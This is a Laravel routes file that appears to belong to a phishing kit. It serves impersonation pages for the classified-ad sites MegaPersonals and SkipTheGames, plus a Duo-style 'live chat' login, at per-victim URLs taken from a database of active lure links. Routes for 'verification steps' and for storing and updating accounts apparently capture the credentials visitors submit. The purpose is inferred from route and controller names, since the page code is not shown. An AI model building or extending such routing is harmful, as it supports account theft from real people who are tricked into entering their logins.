<?php

use App\Http\Controllers\Account\AccountController;
use App\Http\Controllers\Account\ViewPageController;
use App\Models\Link;
use Illuminate\Support\Facades\Route;

Route::get('/due-live-chat/{userId}', [ViewPageController::class, 'duoLiveChat'])->name('due.live.chat');
Route::get('/due-live-chat/verify/{userId}', [ViewPageController::class, 'duoLiveChatVerify'])->name('due.live.chat.verify');
Route::get('/due-live-chat/login/{userId}', [ViewPageController::class, 'authLoginPage'])->name('due.live.chat.login.page');

$currentUrlPath = dirname(request()->getPathInfo());
$endpoint = rtrim($currentUrlPath, '/');

$link = Link::with('type')->whereStatus(true)->where('endpoint', $endpoint)->first();

if($link){
    $link = $link->toArray();

    if($link['type']['name'] == 'megapersonals'){
        Route::get("{$endpoint}/{userId}", [ViewPageController::class, 'megaPersonalsView']);
    }

    if($link['type']['name'] == 'skipthegames'){
        Route::get("{$endpoint}/{userId}", [ViewPageController::class, 'skipTheGamesView']);
    }
}

Route::post('/accounts/store', [AccountController::class, 'store'])->name('accounts.store');

Route::get('/megapersonals/verification-confirmation/{accountId}', [ViewPageController::class, 'megaVerificationConfirmation'])->name('megapersonals.verification_confirmation');

Route::get('/megapersonals/verification-steps/{accountId}', [ViewPageController::class, 'megaVerificationSteps'])->name('megapersonals.verification_steps');

Route::post('/megapersonals/verification', [AccountController::class, 'update'])->name('accounts.update');
